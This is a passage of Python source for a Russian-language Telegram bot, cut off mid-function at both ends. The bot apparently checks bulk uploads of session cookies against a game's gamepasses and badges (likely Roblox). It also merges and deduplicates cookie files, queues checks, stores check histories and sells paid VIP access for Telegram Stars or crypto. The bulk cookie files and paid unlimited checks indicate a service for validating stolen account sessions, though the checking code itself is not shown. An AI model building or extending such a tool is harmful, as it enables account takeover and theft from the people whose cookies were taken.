        # Показываем только название геймпасса (первый элемент tuple)
        gp_display = gp_id[0] if isinstance(gp_id, (tuple, list)) else gp_id
        keyboard_rows.append([
            InlineKeyboardButton(text=f"{is_selected} {gp_display}", callback_data=f"toggle_game_gp_{game_name}_{actual_idx}")
        ])
    
    # Навигация
    nav_row = []
    if page_index > 0:
        nav_row.append(InlineKeyboardButton(text="⬅️", callback_data=f"gp_page_prev_{game_name}"))
    if page_index < total_pages - 1:
        nav_row.append(InlineKeyboardButton(text="➡️", callback_data=f"gp_page_next_{game_name}"))
    
    if nav_row:
        keyboard_rows.append(nav_row)
    
    keyboard_rows.append([InlineKeyboardButton(text="↩️ Назад", callback_data=f"select_game_params_{game_name}")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    page_info = f"Страница <code>{page_index + 1}/{total_pages}</code>"
    if selected_gp:
        page_info += f" | Выбрано: <code>{len(selected_gp)}</code>"
    
    await callback.message.edit_text(
        f"🎮 <b>ВЫБОР ГЕЙМПАССОВ: {game_name}</b>\n\n"
        f"{page_info}\n\n"
        f"<i>Нажмите на геймпасс чтобы выбрать/отменить</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    
    await state.update_data({f'gp_page_{game_name}': page_index})

@router.callback_query(F.data.startswith("gp_page_prev_"))
async def gp_page_prev(callback: CallbackQuery, state: FSMContext):
    """Предыдущая страница геймпассов"""
    user_id = callback.from_user.id
    game_name = callback.data.replace("gp_page_prev_", "")
    data = await state.get_data()
    page_index = data.get(f'gp_page_{game_name}', 0)
    page_index -= 1
    await state.update_data({f'gp_page_{game_name}': page_index})
    await show_gamepasses_menu(callback, state, user_id, game_name)

@router.callback_query(F.data.startswith("gp_page_next_"))
async def gp_page_next(callback: CallbackQuery, state: FSMContext):
    """Следующая страница геймпассов"""
    user_id = callback.from_user.id
    game_name = callback.data.replace("gp_page_next_", "")
    data = await state.get_data()
    page_index = data.get(f'gp_page_{game_name}', 0)
    page_index += 1
    await state.update_data({f'gp_page_{game_name}': page_index})
    await show_gamepasses_menu(callback, state, user_id, game_name)

@router.callback_query(F.data.startswith("toggle_game_gp_"))
async def toggle_game_gp(callback: CallbackQuery, state: FSMContext):
    """Выбирает/отменяет выбор геймпасса для игры"""
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    # Парсим callback data: toggle_game_gp_{game_name}_{index}
    parts = callback.data.replace("toggle_game_gp_", "").rsplit('_', 1)
    game_name = parts[0]
    gp_index = int(parts[1])
    
    # Получаем список геймпассов игры
    game_class = globals().get(game_name)
    if not game_class or not hasattr(game_class, 'Gamepasses'):
        await callback.answer("⚠️ Геймпассы не найдены", show_alert=True)
        return
    
    gamepasses_list = game_class.Gamepasses.listOfGamepasses if hasattr(game_class.Gamepasses, 'listOfGamepasses') else []
    if gp_index >= len(gamepasses_list):
        await callback.answer("⚠️ Геймпасс не найден", show_alert=True)
        return
    
    gp_id = gamepasses_list[gp_index]
    
    config = Database.get_user_config(user_id)
    selected_gp = config.get(f'game_gamepasses_{game_name}', [])
    
    # Используем gp_id[1] (числовой ID) для сравнения и хранения
    gp_id_num = gp_id[1] if isinstance(gp_id, (tuple, list)) else gp_id
    
    if gp_id_num in selected_gp:
        selected_gp.remove(gp_id_num)
        await callback.answer(f"❌ Геймпасс отменен")
    else:
        selected_gp.append(gp_id_num)
        await callback.answer(f"✅ Геймпасс выбран")
    
    Database.update_config(user_id, f'game_gamepasses_{game_name}', selected_gp)
    # Показываем меню геймпассов
    await show_gamepasses_menu(callback, state, user_id, game_name)

@router.callback_query(F.data.startswith("select_game_params_"))
async def back_to_game_params(callback: CallbackQuery, state: FSMContext):
    """Возвращает в меню параметров игры"""
    game_name = callback.data.replace("select_game_params_", "")
    
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    config = Database.get_user_config(user_id)
    game_badges = config.get(f'game_badges_{game_name}', [])
    game_gamepasses = config.get(f'game_gamepasses_{game_name}', [])
    
    keyboard_rows = [
        [InlineKeyboardButton(text="🏅 Выбрать бейджи", callback_data=f"select_game_badges_{game_name}")],
        [InlineKeyboardButton(text="🎮 Выбрать геймпассы", callback_data=f"select_game_gp_{game_name}")],
        [InlineKeyboardButton(text="🔍 Начать проверку", callback_data="start_game_check")],
        [InlineKeyboardButton(text="⬅️", callback_data="check_games_menu")]
    ]
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    badges_info = f"<code>{len(game_badges)}</code> бейджей" if game_badges else "Не выбраны"
    gp_info = f"<code>{len(game_gamepasses)}</code> геймпассов" if game_gamepasses else "Не выбраны"
    
    await callback.message.edit_text(
        f"⚙️ <b>ПАРАМЕТРЫ ИГРЫ: {game_name}</b>\n\n"
        f"🏅 <b>Бейджи:</b> {badges_info}\n"
        f"🎮 <b>Геймпассы:</b> {gp_info}\n\n"
        f"<i>Выберите параметры для проверки</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "start_game_check")
async def start_game_check(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    data = await state.get_data()
    selected_game = data.get('selected_game')
    
    if not selected_game:
        await callback.answer("⚠️ Выберите игру", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="↩️ Назад", callback_data="check_games_menu")]
    ])
    
    await callback.message.answer(
        f"📁 <b>ВЫБОР ФАЙЛА ДЛЯ ПРОВЕРКИ</b>\n"
        f"\n"
        f"Для игры: <b>{selected_game}</b>\n\n"
        f"📤 <b>Отправьте файл с куками (txt или zip)</b>\n\n"
        f"<i>Поддерживаемые форматы: .txt, .zip</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.check_cookies_for_games)


@router.message(Form.check_cookies_for_games)
async def process_game_check_file(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await bot.send_sticker(message.chat.id, STICKERS['ban'])
        await message.answer(f"🚫 <b>Вы заблокированы.</b>\nПричина: {reason}", parse_mode=ParseMode.HTML)
        await state.clear()
        return
    
    data = await state.get_data()
    selected_game = data.get('selected_game')
    
    file_path = None
    cookies_text = None
    
    if message.document:
        if message.document.file_name.endswith('.zip'):
            await message.answer(
                f"❌ <b>ОШИБКА ФОРМАТА</b>\n\n"
                f"⚠️ Для проверки игры нельзя использовать ZIP файлы.\n"
                f"📁 Пожалуйста, отправьте TXT файл с куками.",
                parse_mode=ParseMode.HTML
            )
            return
        
        if not message.document.file_name.endswith('.txt'):
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await message.answer("❌ <b>Неверный формат файла.</b>\nОтправьте текстовый файл (.txt).", parse_mode=ParseMode.HTML)
            return
        
        file_id = message.document.file_id
        file_name = f"{random.randint(100000, 999999)}.txt"
        file_path = f"{COOKIE_FILES_DIR}{file_name}"
        
        msg = await message.answer("📥 <b>Скачиваю файл...</b>\n<i>Это может занять время для больших файлов.</i>", parse_mode=ParseMode.HTML)
        
        try:
            await bot.download(file_id, destination=file_path)
            file_info = process_cookie_file(file_path)
        except Exception as e:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await msg.edit_text(
                f"❌ <b>ОШИБКА СКАЧИВАНИЯ ФАЙЛА</b>\n\n"
                f"<code>{str(e)[:100]}</code>",
                parse_mode=ParseMode.HTML
            )
            return
            
    elif message.text:
        cookies_text = message.text.strip()
        if not cookies_text:
            await message.answer(
                f"❌ <b>ОШИБКА</b>\n\n"
                f"📤 <b>Пожалуйста, отправьте куки в виде текста или файла</b>",
                parse_mode=ParseMode.HTML
            )
            return
        
        lines = cookies_text.split('\n')
        cookies_list = [line.strip() for line in lines if line.strip()]
        
        file_info = {
            'cookies': cookies_list,
            'total_lines': len(cookies_list),
            'duplicates': 0,
            'invalid_lines': 0
        }
        
        msg = await message.answer("⏳ <b>Обрабатываю куки...</b>", parse_mode=ParseMode.HTML)
    else:
        await message.answer(
            f"❌ <b>ОШИБКА</b>\n\n"
            f"📤 <b>Пожалуйста, отправьте файл с куками или куки текстом</b>\n\n"
            f"<i>Поддерживаемые форматы: .txt или прямой текст</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        if not file_info['cookies']:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await msg.edit_text(
                f"❌ <b>ПРОВЕРКА ФАЙЛА</b>\n"
                f"\n"
                f"🚫 <b>В источнике не найдено валидных куки.</b>\n\n"
                f"<i>Проверьте формат файла и попробуйте снова.</i>",
                parse_mode=ParseMode.HTML
            )
            return
        
        config = Database.get_user_config(user_id)
        game_badges = config.get(f'game_badges_{selected_game}', [])
        game_gamepasses = config.get(f'game_gamepasses_{selected_game}', [])
        
        await state.update_data({
            'game_check_file': file_path,
            'selected_game': selected_game,
            'game_badges': game_badges,
            'game_gamepasses': game_gamepasses
        })

        output_format = config.get('output_format', DEFAULT_OUTPUT_FORMAT.copy())
        format_info = "ZIP" if output_format.get('zip', True) else "TXT"
        
        await msg.edit_text(
            f"💾 <b>Данные приняты. Что дальше?</b>\n"
            f"\n"
            f"📊 <b>Статистика:</b>\n"
            f"├ Всего куки: <code>{file_info['total_lines']:,}</code>\n"
            f"├ Валидных куки: <code>{len(file_info['cookies']):,}</code>\n"
            f"├ Дубликатов: <code>{file_info['duplicates']}</code>\n"
            f"└ Невалидных строк: <code>{file_info['invalid_lines']}</code>\n\n"
            f"🎮 <b>Игра:</b> <code>{selected_game}</code>\n"
            f"🏅 <b>Бейджи:</b> <code>{len(game_badges)}</code>\n"
            f"🎮 <b>Геймпассы:</b> <code>{len(game_gamepasses)}</code>\n"
            f"📁 <b>Формат вывода:</b> <code>{format_info}</code>\n\n"
            f"Выберите следующий шаг:",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Начать проверку", callback_data="confirm_game_check")],
                [InlineKeyboardButton(text="❌ Отмена", callback_data="check_games_menu")]
            ])
        )
    except Exception as e:
        await bot.send_sticker(message.chat.id, STICKERS['error'])
        error_message = (
            f"❌ <b>ОШИБКА ОБРАБОТКИ</b>\n"
            f"\n"
            f"📝 <b>Произошла ошибка:</b>\n"
            f"<code>{str(e)}</code>\n\n"
            f"🔄 <b>Решение:</b>\n"
            f"1. Проверьте формат файла\n"
            f"2. Убедитесь, что это .txt файл\n"
            f"3. Попробуйте еще раз\n\n"
            f"<i>Если ошибка повторяется, обратитесь в поддержку.</i>"
        )
        await message.answer(error_message, parse_mode=ParseMode.HTML)
        logging.error(f"Ошибка обработки файла для проверки игры: {e}")
    finally:
        if file_path and os.path.exists(file_path):
            os.remove(file_path)


class CookieSorter:
    @staticmethod
    def merge_cookie_files(files_data: list) -> dict:
        """Объединяет несколько списков кук в один, удаляет дубликаты"""
        all_cookies = set()
        total_files = len(files_data)
        total_cookies = 0
        duplicates = 0
        
        for file_data in files_data:
            for cookie in file_data['cookies']:
                total_cookies += 1
                if cookie in all_cookies:
                    duplicates += 1
                else:
                    all_cookies.add(cookie)
        
        return {
            'cookies': list(all_cookies),
            'total_files': total_files,
            'total_cookies': total_cookies,
            'unique_cookies': len(all_cookies),
            'duplicates': duplicates
        }
    
    @staticmethod
    async def process_merged_cookies(user_id: int, merged_data: dict, message: Message):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            merged_file = f"{COOKIE_FILES_DIR}merged_cookies_{timestamp}.txt"
            
            with open(merged_file, 'w', encoding='utf-8') as f:
                f.write('\n'.join(merged_data['cookies']))
            
            report_text = (
                f"✅ <b>КУКИ ОБЪЕДИНЕНЫ</b>\n"
                f"\n"
                f"📊 <b>Результат объединения:</b>\n"
                f"├ Всего файлов: <code>{merged_data['total_files']}</code>\n"
                f"├ Всего кук: <code>{merged_data['total_cookies']:,}</code>\n"
                f"├ Уникальных кук: <code>{merged_data['unique_cookies']:,}</code>\n"
                f"└ Дубликатов удалено: <code>{merged_data['duplicates']}</code>\n\n"
                f"📁 <b>Файл сохранен и готов к использованию</b>\n"
                f"══════════════════════════"
            )
            
            await message.answer_document(
                document=FSInputFile(merged_file),
                caption=report_text,
                parse_mode=ParseMode.HTML
            )
            
            os.remove(merged_file)
            
        except Exception as e:
            await bot.send_sticker(user_id, STICKERS['error'])
            await message.answer(
                f"❌ <b>ОШИБКА ОБЪЕДИНЕНИЯ</b>\n\n"
                f"<code>{str(e)}</code>",
                parse_mode=ParseMode.HTML
            )


@router.message(F.text == "Sorter")
async def sorter_handler(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"🚫 Вы заблокированы. Причина: {reason}")
        return
    
    await state.set_data({
        'sorter_files': [],
        'sorter_mode': True
    })
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📁 Добавить файл", callback_data="add_sorter_file")],
        [InlineKeyboardButton(text="✅ Объединить файлы", callback_data="merge_sorter_files")],
        [InlineKeyboardButton(text="🗑 Очистить список", callback_data="clear_sorter_files")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ])
    
    await message.answer(
        f"🔄 <b>СОРТИРОВЩИК КУКОВ</b>\n"
        f"\n"
        f"📁 <b>Функции:</b>\n"
        f"├ Объединяет куки из нескольких файлов\n"
        f"├ Удаляет дубликаты\n"
        f"└ Сохраняет результат в один файл\n\n"
        f"📊 <b>Текущее состояние:</b>\n"
        f"├ Файлов добавлено: <code>0</code>\n"
        f"├ Кук обработано: <code>0</code>\n"
        f"└ Дубликатов: <code>0</code>\n\n"
        f"<i>Добавьте файлы и нажмите «Объединить»</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "add_sorter_file")
async def add_sorter_file_handler(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    await callback.message.answer(
        f"📁 <b>ДОБАВЛЕНИЕ ФАЙЛА В СОРТИРОВЩИК</b>\n"
        f"\n"
        f"1. <b>Отправьте файл с куками (.txt)</b>\n"
        f"2. <b>Файл будет добавлен в список для объединения</b>\n\n"
        f"⚠️ <b>Внимание:</b>\n"
        f"├ Можно добавлять несколько файлов\n"
        f"├ Формат: только .txt\n"
        f"└ Размер: до 20MB каждый\n\n"
        f"<i>Отправьте файл сейчас</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML
    )
    
    await state.set_state(Form.cookie_sorter)

@router.message(Form.cookie_sorter)
async def process_sorter_file(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await bot.send_sticker(message.chat.id, STICKERS['ban'])
        await message.answer(f"🚫 <b>Вы заблокированы.</b>\nПричина: {reason}", parse_mode=ParseMode.HTML)
        await state.clear()
        return
    
    file_path = None
    
    try:
        if not message.document:
            await message.answer("❌ <b>Пожалуйста, отправьте файл с куками.</b>", parse_mode=ParseMode.HTML)
            return

        if not message.document.file_name.endswith('.txt'):
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await message.answer("❌ <b>Неверный формат файла.</b>\nОтправьте текстовый файл (.txt).", parse_mode=ParseMode.HTML)
            return

        file_id = message.document.file_id
        file_name = f"sorter_{random.randint(100000, 999999)}.txt"
        file_path = f"{COOKIE_FILES_DIR}{file_name}"
        
        msg = await message.answer("📥 <b>Обрабатываю файл...</b>", parse_mode=ParseMode.HTML)
        
        await bot.download(file_id, destination=file_path)
        
        file_info = process_cookie_file(file_path)
        
        if not file_info['cookies']:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await msg.edit_text(
                f"❌ <b>ФАЙЛ ПУСТОЙ</b>\n"
                f"\n"
                f"🚫 <b>В файле не найдено валидных куки.</b>\n\n"
                f"<i>Попробуйте другой файл.</i>",
                parse_mode=ParseMode.HTML
            )
            return
        
        data = await state.get_data()
        sorter_files = data.get('sorter_files', [])
        
        sorter_files.append({
            'name': message.document.file_name,
            'data': file_info,
            'added': datetime.now().strftime("%H:%M:%S")
        })
        
        await state.update_data({'sorter_files': sorter_files})
        
        total_files = len(sorter_files)
        total_cookies = sum(len(f['data']['cookies']) for f in sorter_files)
        
        await msg.edit_text(
            f"✅ <b>ФАЙЛ ДОБАВЛЕН</b>\n"
            f"\n"
            f"📊 <b>Статистика файла:</b>\n"
            f"├ Название: <code>{message.document.file_name}</code>\n"
            f"├ Кук в файле: <code>{len(file_info['cookies']):,}</code>\n"
            f"└ Время добавления: <code>{datetime.now().strftime('%H:%M:%S')}</code>\n\n"
            f"📈 <b>Общая статистика:</b>\n"
            f"├ Файлов добавлено: <code>{total_files}</code>\n"
            f"├ Всего кук: <code>{total_cookies:,}</code>\n"
            f"└ Среднее кук/файл: <code>{total_cookies//total_files if total_files > 0 else 0}</code>\n\n"
            f"<i>Продолжайте добавлять файлы или нажмите «Объединить»</i>",
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        await bot.send_sticker(message.chat.id, STICKERS['error'])
        await message.answer(
            f"❌ <b>ОШИБКА ОБРАБОТКИ</b>\n\n"
            f"<code>{str(e)[:100]}</code>",
            parse_mode=ParseMode.HTML
        )
    finally:
        if file_path and os.path.exists(file_path):
            os.remove(file_path)

@router.callback_query(F.data == "merge_sorter_files")
async def merge_sorter_files_handler(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    data = await state.get_data()
    sorter_files = data.get('sorter_files', [])
    
    if not sorter_files:
        await callback.answer("⚠️ Нет файлов для объединения", show_alert=True)
        return
    
    await callback.answer("🔄 Начинаю объединение...")
    
    files_data = [f['data'] for f in sorter_files]
    merged_data = CookieSorter.merge_cookie_files(files_data)
    
    await CookieSorter.process_merged_cookies(user_id, merged_data, callback.message)
    
    await state.update_data({'sorter_files': []})

@router.callback_query(F.data == "clear_sorter_files")
async def clear_sorter_files_handler(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    await state.update_data({'sorter_files': []})
    await callback.answer("✅ Список файлов очищен", show_alert=True)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📁 Добавить файл", callback_data="add_sorter_file")],
        [InlineKeyboardButton(text="✅ Объединить файлы", callback_data="merge_sorter_files")],
        [InlineKeyboardButton(text="🗑 Очистить список", callback_data="clear_sorter_files")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ])
    
    await callback.message.edit_text(
        f"🔄 <b>СОРТИРОВЩИК КУКОВ</b>\n"
        f"\n"
        f"📁 <b>Функции:</b>\n"
        f"├ Объединяет куки из нескольких файлов\n"
        f"├ Удаляет дубликаты\n"
        f"└ Сохраняет результат в один файл\n\n"
        f"📊 <b>Текущее состояние:</b>\n"
        f"├ Файлов добавлено: <code>0</code>\n"
        f"├ Кук обработано: <code>0</code>\n"
        f"└ Дубликатов: <code>0</code>\n\n"
        f"<i>Добавьте файлы и нажмите «Объединить»</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "confirm_game_check")
async def confirm_game_check(callback: CallbackQuery, state: FSMContext):
    """Подтверждает начало проверки куки для выбранной игры"""
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    data = await state.get_data()
    selected_game = data.get('selected_game')
    game_badges = data.get('game_badges', [])
    game_gamepasses = data.get('game_gamepasses', [])
    file_path = data.get('game_check_file')
    
    if not selected_game:
        await callback.answer("⚠️ Игра не выбрана", show_alert=True)
        return
    
    if not file_path or not os.path.exists(file_path):
        await callback.answer("⚠️ Файл не найден", show_alert=True)
        return
    
    try:
        # Обрабатываем файл
        file_info = process_cookie_file(file_path)
        
        if not file_info['cookies']:
            await callback.answer("❌ В файле не найдены валидные куки", show_alert=True)
            return
        
        # Добавляем в очередь с доп информацией о игре
        game_check_info = {
            **file_info,
            'game_name': selected_game,
            'game_badges': game_badges,
            'game_gamepasses': game_gamepasses
        }
        
        msg = await callback.message.answer(
            f"📤 <b>Добавляю в очередь проверки...</b>",
            parse_mode=ParseMode.HTML
        )
        
        check_queue.put((user_id, game_check_info, msg))
        queue_size = check_queue.qsize()
        
        if current_checking is None:
            status_msg = (
                f"✅ <b>ПРОВЕРКА ДОБАВЛЕНА В ОЧЕРЕДЬ</b>\n"
                f"\n"
                f"🎮 <b>Игра:</b> <code>{selected_game}</code>\n"
                f"📊 <b>Статистика файла:</b>\n"
                f"├ Всего строк: <code>{file_info['total_lines']:,}</code>\n"
                f"├ Валидных куки: <code>{len(file_info['cookies']):,}</code>\n"
                f"├ Дубликатов: <code>{file_info['duplicates']}</code>\n"
                f"└ Невалидных строк: <code>{file_info['invalid_lines']}</code>\n\n"
                f"🎯 <b>Статус:</b> Первая в очереди\n"
                f"⏳ <b>Начало проверки:</b> Следующий\n\n"
                f"<i>Ожидайте начала проверки...</i>"
            )
        else:
            status_msg = (
                f"✅ <b>ПРОВЕРКА ДОБАВЛЕНА В ОЧЕРЕДЬ</b>\n"
                f"\n"
                f"🎮 <b>Игра:</b> <code>{selected_game}</code>\n"
                f"📊 <b>Статистика файла:</b>\n"
                f"├ Всего строк: <code>{file_info['total_lines']:,}</code>\n"
                f"├ Валидных куки: <code>{len(file_info['cookies']):,}</code>\n"
                f"├ Дубликатов: <code>{file_info['duplicates']}</code>\n"
                f"└ Невалидных строк: <code>{file_info['invalid_lines']}</code>\n\n"
                f"📍 <b>Позиция в очереди:</b> <code>{queue_size}</code>\n"
                f"⏱ <b>Примерное время ожидания:</b> <code>{queue_size * 2}-{queue_size * 5}</code> минут\n\n"
                f"<i>Статус очереди будет обновляться автоматически.</i>"
            )
        
        await msg.edit_text(status_msg, parse_mode=ParseMode.HTML)
        await notify_queue_update()
        
    except Exception as e:
        await bot.send_sticker(callback.message.chat.id, STICKERS['error'])
        error_message = (
            f"❌ <b>ОШИБКА ДОБАВЛЕНИЯ В ОЧЕРЕДЬ</b>\n"
            f"\n"
            f"📝 <b>Произошла ошибка:</b>\n"
            f"<code>{str(e)}</code>\n\n"
            f"🔄 <b>Решение:</b>\n"
            f"1. Проверьте файл\n"
            f"2. Убедитесь, что это .txt файл\n"
            f"3. Попробуйте еще раз\n\n"
            f"<i>Если ошибка повторяется, обратитесь в поддержку.</i>"
        )
        await callback.message.answer(error_message, parse_mode=ParseMode.HTML)
        logging.error(f"Ошибка добавления проверки игры в очередь: {e}")
    finally:
        # Удаляем файл
        if file_path and os.path.exists(file_path):
            os.remove(file_path)
        await state.clear()

@router.callback_query(F.data == "back_to_check_params")
async def back_to_check_params(callback: CallbackQuery):
    """Возвращает в главное меню Cookie Check"""
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    config = Database.get_user_config(user_id)
    keyboard_rows = []
    
    keyboard_rows.append([InlineKeyboardButton(text="⚙️ Настройки чека", callback_data="check_settings_menu")])
    keyboard_rows.append([InlineKeyboardButton(text="📁 Проверить файл", callback_data="start_check_file")])
    keyboard_rows.append([InlineKeyboardButton(text="📝 Проверить сообщение", callback_data="start_check_message")])
    keyboard_rows.append([
        InlineKeyboardButton(text="🏅 Указать бэйджи", callback_data="set_badge"),
        InlineKeyboardButton(text="🎮 Указать геймпассы", callback_data="set_gp")
    ])
    keyboard_rows.append([InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_menu")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    await callback.message.edit_text( 
        f"Выберите, что сканировать:\n\n"
        f"<i>Нажмите на параметр чтобы включить/выключить</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )


async def show_history(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    user_dir = f'{DATABASE_DIR}{callback.from_user.id}/checks/'
    if not os.path.exists(user_dir):
        await callback.message.answer("📭 <b>История проверок пуста</b>", parse_mode=ParseMode.HTML)
        return
    
    checks = sorted(os.listdir(user_dir), reverse=True)
    if not checks:
        await callback.message.answer("📭 <b>История проверок пуста</b>", parse_mode=ParseMode.HTML)
        return
    
    inline_keyboard = [
        [InlineKeyboardButton(text=f"📅 {check}", callback_data=f"check_{check}")] for check in checks[:10]
    ]
    inline_keyboard.append([InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=inline_keyboard)
    
    await callback.message.edit_text(
        f"📜 <b>ИСТОРИЯ ПРОВЕРОК</b>\n"
        f"\n"
        f"📊 <b>Всего проверок:</b> <code>{len(checks)}</code>\n\n"
        f"📅 <b>Выберите проверку для просмотра результатов:</b>\n\n"
        f"<i>Показано последние 10 проверок</i>\n"
        f"══════════════════════════",
        reply_markup=keyboard,
        parse_mode=ParseMode.HTML
    )

@router.callback_query(F.data.startswith("check_"))
async def send_check_files(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    check_id = callback.data.split('_', 1)[1]
    check_dir = f'{DATABASE_DIR}{callback.from_user.id}/checks/{check_id}/'
    
    if not os.path.exists(check_dir):
        await callback.answer("📭 Результаты проверки не найдены", show_alert=True)
        return
    
    files = []
    for fname in sorted(os.listdir(check_dir)):
        if fname.endswith('.txt'):
            file_path = f'{check_dir}{fname}'
            if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
                files.append(InputMediaDocument(media=FSInputFile(file_path)))
    
    if files:
        files[-1].caption = f"📊 <b>Результаты проверки от {check_id}</b>\n══════════════════════════"
        await callback.message.answer_media_group(files, parse_mode=ParseMode.HTML)
        await callback.answer("✅ Файлы отправлены")
    else:
        await callback.answer("📭 Нет данных для отчета", show_alert=True)

@router.callback_query(F.data == "buy_vip")
async def buy_vip(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        await callback.answer("🚫 Вы заблокированы", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐ 300 Telegram Stars", callback_data="pay_stars_300")],
        [InlineKeyboardButton(text="💳 $2 CryptoBot", callback_data="pay_cryptobot")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_profile")]
    ])
    
    await callback.message.edit_text(
        f"👑 <b>КУПИТЬ VIP</b>\n\n"
        f"Преимущества VIP:\n"
        f"├ Приоритет в очереди проверок\n"
        f"├ Неограниченные проверки\n"
        f"├ Более быстрая обработка\n"
        f"└ Эксклюзивные функции\n\n"
        f"<b>Выберите метод оплаты:</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "pay_cryptobot")
async def pay_with_cryptobot(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        await callback.answer("🚫 Вы заблокированы", show_alert=True)
        return
    
    await callback.answer()
    
    pay_url, invoice_id = create_crypto_invoice(user_id, amount=2)
    
    if pay_url and invoice_id:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💳 Перейти к оплате", url=pay_url)],
            [InlineKeyboardButton(text="🔄 Проверить статус", callback_data=f"check_payment_{invoice_id}")],
            [InlineKeyboardButton(text="↩️ Назад", callback_data="buy_vip")]
        ])
        
        await callback.message.edit_text(
            f"<b>💳 ОПЛАТА ЧЕРЕЗ CRYPTOBOT</b>\n\n"
            f"Сумма: 2.00 USDT\n"
            f"Товар: VIP подписка на 30 дней\n\n"
            f"🔗 Нажмите на кнопку ниже для оплаты:\n"
            f"<a href='{pay_url}'>Ссылка для оплаты</a>\n\n"
            f"После оплаты нажмите 'Проверить статус' для активации VIP.",
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
        
        Database.add_pending_payment(user_id, invoice_id, "cryptobot", 2.0, 30)
    else:
        await callback.message.edit_text(
            "❌ Ошибка при создании счета на оплату. Попробуйте позже.",
            parse_mode=ParseMode.HTML
        )

@router.callback_query(F.data == "pay_stars_300")
async def pay_with_stars(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        await callback.answer("🚫 Вы заблокированы", show_alert=True)
        return
    
    try:
